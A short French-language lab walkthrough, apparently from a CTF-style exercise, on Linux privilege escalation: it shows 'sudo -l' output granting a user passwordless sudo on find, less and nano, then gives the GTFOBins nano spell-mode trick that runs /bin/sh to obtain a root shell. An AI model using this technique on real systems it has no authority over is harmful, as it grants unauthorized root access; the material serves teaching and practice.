
## __Sudo -l__

Grâce à la commande **`sudo -l`**, on peut récuperer les commandes que l'on peut éxecuter en sudo.

```shell
$ sudo -l
Matching Defaults entries for karen on ip-10-10-127-120:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-127-120:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

Ici on peut voir que l'utilisateur peut utiliser nano en sudoer.

On peut voir sur **[gtfobins](https://gtfobins.github.io/gtfobins/nano/)** qu'on peut effectuer une **élévation des privilèges** avec **Nano** en executant **`/bin/sh`** en **SPELL** mode. 

```shell
./nano -s /bin/sh
/bin/sh
^T
```

On peut ensuite voir qu'on passe en root.


